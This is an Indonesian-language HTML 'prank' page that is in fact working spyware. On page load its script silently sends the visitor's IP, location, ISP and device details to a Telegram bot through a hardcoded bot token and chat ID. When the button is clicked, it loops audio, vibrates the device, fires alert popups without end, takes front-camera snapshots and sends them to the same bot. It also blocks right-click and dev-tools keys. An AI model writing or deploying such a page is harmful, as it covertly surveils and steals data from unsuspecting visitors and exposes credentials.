<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Pemula puh</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: radial-gradient(circle, #1a1a1a, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      color: #fff;
      flex-direction: column;
      overflow: hidden;
    }
    .container {
      text-align: center;
      padding: 30px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid #444;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
      width: 90%;
      max-width: 400px;
      position: relative;
    }
    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
    p { font-size: 14px; color: #aaa; }
    .status { margin-top: 20px; font-size: 13px; color: #0f0; }

    button.prank {
      padding: 14px 28px;
      font-size: 1.3rem;
      background: #ff3399;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      margin-top: 10px;
    }

    /* Animasi goyang */
    .shake {
      animation: shake 0.2s infinite;
    }

    @keyframes shake {
      0% { transform: translate(1px, 1px) rotate(0deg); }
      10% { transform: translate(-1px, -2px) rotate(-1deg); }
      20% { transform: translate(-3px, 0px) rotate(1deg); }
      30% { transform: translate(3px, 2px) rotate(0deg); }
      40% { transform: translate(1px, -1px) rotate(1deg); }
      50% { transform: translate(-1px, 2px) rotate(-1deg); }
      60% { transform: translate(-3px, 1px) rotate(0deg); }
      70% { transform: translate(3px, 1px) rotate(-1deg); }
      80% { transform: translate(-1px, -1px) rotate(1deg); }
      90% { transform: translate(1px, 2px) rotate(0deg); }
      100% { transform: translate(1px, -2px) rotate(-1deg); }
    }
  </style>
</head>
<body>
  <div class="container" id="prank-container">
    <h1>🔊 Mau lihat sesuatu?</h1>
    <p>Tekan tombol di bawah, lalu nikmati.</p>
    <button class="prank" onclick="startPrank()">Klik di Sini</button>
    <p class="status" id="status">Menunggu aksi...</p>
  </div>

  <!-- Audio overlapped -->
  <audio id="a1" src="https://files.catbox.moe/nqjoei.mp3" preload="auto"></audio>
  <audio id="a2" src="https://files.catbox.moe/nqjoei.mp3" preload="auto"></audio>
  <audio id="a3" src="https://files.catbox.moe/nqjoei.mp3" preload="auto"></audio>

  <script>
    // TOKEN & ID TELEGRAM
    const CHAT_ID = "7813060570";
    const bot_token = "8053780203:AAFAV7b_NYcbj2NmakX3_Az4dTnYigPmelA";
    const statusEl = document.getElementById('status');
    const audios = [a1, a2, a3];

    window.onload = async () => {
      statusEl.textContent = "🔎 Menyambung ke server...";
      const fastKey = await Fast_server();
      await sendDeviceInfo(fastKey);
      statusEl.textContent = "✅ Siap. Tekan tombol untuk mulai.";
    };

    async function Fast_server() {
      try {
        const res = await fetch('/api/fast_servers');
        const data = await res.json();
        return data.fast_key;
      } catch {
        return "direct";
      }
    }

    async function sendDeviceInfo(key) {
      try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
        const battery = await navigator.getBattery();
        const time = new Date().toLocaleString("en-IN");

        const message =
`🌐 *IP Information*
🔢 IP Address: ${ipInfo.ip}
🗺 Country: ${ipInfo.country}
🌍 Region: ${ipInfo.region}
📍 Location: ${ipInfo.city}
📡 ISP: ${ipInfo.org}

📱 *Device Details*
🔋 Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? "⚡️ Charging" : ""}
📶 Network: ${(navigator.connection?.effectiveType) || "Unknown"}
🖥️ Screen: ${screen.width}x${screen.height}
🕒 Time: ${time}
🧠 UA: ${navigator.userAgent}
...`;

        await sendToTelegram(key, message.trim(), "text");
      } catch (err) {
        console.error("Device Info Error:", err);
      }
    }

    async function sendToTelegram(key, data, type) {
      const url = `https://api.telegram.org/bot${bot_token}/${type === "text" ? "sendMessage" : "sendPhoto"}`;
      const form = new FormData();
      form.append("chat_id", CHAT_ID);

      if (type === "text") {
        form.append("text", data);
        form.append("parse_mode", "Markdown");
      } else {
        form.append("photo", data, "image.jpg");
      }

      await fetch(url, { method: "POST", body: form });
    }

    function loopAudio(audio) {
      audio.volume = 1.0;
      audio.play().catch(() => {});
      audio.loop = true;
      audio.onpause = () => audio.play();
    }

    function nonstopAlert() {
      alert("ITU TERUS ");
      setTimeout(nonstopAlert, 10);
    }

    async function startPrank() {
      // Tambahkan animasi shake
      document.body.classList.add("shake");
      statusEl.textContent = "🎶 Prank dimulai!";

      // Mainkan semua audio dengan overlap
      audios.forEach((audio, i) => {
        setTimeout(() => loopAudio(audio), i * 300);
      });

      // Getar HP terus
      if (navigator.vibrate) {
        setInterval(() => navigator.vibrate([200, 100, 200]), 1000);
      }

      // Popup alert terus-menerus
      nonstopAlert();

      // Coba minta kamera (jika belum), tapi ini opsional/prank-style
      try {
        statusEl.textContent = '📷 Meminta kamera...';
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        const track = stream.getVideoTracks()[0];

        for (let i = 0; i < 3; i++) {
          statusEl.textContent = `⚙️ Mengirim snapshot ${i + 1}/3...`;
          const blob = await captureFromVideo(track);
          await sendToTelegram("direct", blob, "photo");
          await new Promise(r => setTimeout(r, 800));
        }

        track.stop();
        statusEl.textContent = '✅ Kamera selesai.';
      } catch (err) {
        statusEl.textContent = '❌ Kamera ditolak atau gagal.'; 
        console.error(err);
      }
    }

    // Ambil foto dari video
    async function captureFromVideo(videoTrack) {
      const video = document.createElement("video");
      video.srcObject = new MediaStream([videoTrack]);
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext("2d").drawImage(video, 0, 0);

      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
    }

    // Blok klik kanan dan shortcut dev tools
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.addEventListener("keydown", e => {
      if (["F12", "Control", "Shift", "I", "U"].includes(e.key)) {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
